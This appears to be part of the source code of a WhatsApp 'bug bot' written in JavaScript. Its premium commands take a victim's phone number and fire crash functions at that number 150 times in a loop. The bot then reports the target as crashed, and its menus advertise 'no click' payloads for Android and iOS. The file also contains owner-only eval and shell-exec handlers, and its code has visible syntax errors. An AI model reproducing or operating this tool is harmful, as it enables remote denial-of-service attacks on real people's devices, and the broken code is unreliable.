      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "storm",
        "sections": [
            {
                "title": "storm",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".rapip-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'zynzz-crash':
case 'mantra-crash':
case 'extreme-bug':
case 'goto-war':
case 'mati-kau':
case 'delicous':
case 'bug-calls':
case 'instant-time':
case 'thunder':
case 'crash-storm':
case 'mid-night':{
if (!PremOnly) return ReplyRap(`sok asik dih dih modal makanyay`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : zynzz-crash 628xxx`)
let isTarget = bijipler + '@s.whatsapp.net'
ReplyRap(`[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${isTarget}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`𝐓𝐡𝐮𝐧𝐝𝐞𝐫 𝐒𝐭𝐨𝐫𝐦 𝐕𝟏 𝐆𝐞𝐧 𝟎\`
\`ALLBUYYERTHUNDER\`  `)
for (let i = 0; i < 150; i++) {
await InVisiLoc(target, wanted) 
await FcUi(target, wanted) 
await LocInvis(target, wanted)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "Thunder Storm",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "storm",
        "sections": [
            {
                "title": "storm",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".rapip-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'isdark':
case 'yokuzodenoiterama':
case 'fitoridaratee':
{
if (!PremOnly) return Replystorm(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : isdark 62xx_\n\𝐑ikyy✰`)
let isTarget = bijipler + '@s.whatsapp.net'
ReplyRap(`[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${isTarget}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`🍷𝐓𝐇𝐔𝐍𝐃𝐄𝐑 𝐕𝟏 𝐆𝐄𝐍 𝟏\`
\`ALLBUYYERTHUNDER\`  `)
for (let i = 0; i < 150; i++) {
await FcUi(target, wanted) 
await InVisiLoc(target, wanted) 
await InVisiLocNull(target, wanted) 
await LocatiOn(target, wanted) 
await LocInvis(target, wanted)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "Thunder Storm",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Thunder Storm",
        "sections": [
            {
                "title": "Zynzz",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".rapip-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

case 'crash-target':
case 'night-vision':
case 'kurama':
case 'hysitorume': 
{
if (!PremOnly) return ReplyRap(`premium only`)
if (!q) return ReplyRap(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ReplyRap(`*Error!*\n\n_Use : ${command} Number_\n_Example : Rap 62xx_\n\𝐑ikyý🐉✰`)
let isTarget = bijipler + '@s.whatsapp.net'
ReplyRap(`[ 𝗣𝗥𝗢𝗦𝗘𝗦 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚 ]
✾ TO :${isTarget}
✾ CMD : *${command}*
✾ TYPE : BUG BUTTON NEW

 \`🍷AustinGrifin 𝗩1 𝗚𝗘𝗡 1👻\`
\`ALLOWNERAUSTIN🐉\`  `)
for (let i = 0; i < 150; i++) {
await FcUi(target, wanted) 
await InVisiLoc(target, wanted) await LocInvis(target, wanted)
}
let After = `[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_`
sock.sendMessage(m.chat, {
  caption: After, 
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" },
  footer: "zynzz",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "𝐑͢𝐚̃̈𝐩𝐢̶̳̾𝐩𝐩𝐒̶̛𝐚̋˞𝐭̟͟𝐨𝐫̏͟𝐮",
        "sections": [
            {
                "title": "𝑿͢𝑹𝒑𝒊𝒑̶͢͠𝒑𝑴̾𝒐𝒅̈́𝒔̗𝒔🌹",
                "highlight_label": "",
                "rows": [
                    {

                        "header": "manipulation bug ( click/relog )",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐞𝐝𝐅𝐨𝐥𝐝",
                        "description": "Beta Force",
                        "id": ".killed-ui"
                    },
                    {
                    header": "payload ( no click )",
                        "title": "𝐅𝐨𝐥𝐝𝐢𝐧𝐠𝐗𝐦𝐞𝐭𝐚",
                        "description": "⩟",
                        "id": ".rapip-elite"
                    },
                    {
                    header": "For Android",
                        "title": "𝐂𝐫𝐚𝐬𝐡𝐎𝐮𝐭",
                        "description": "⩟",
                        "id": ".bugios4 "
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break

//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
}) 
//==========================================================\\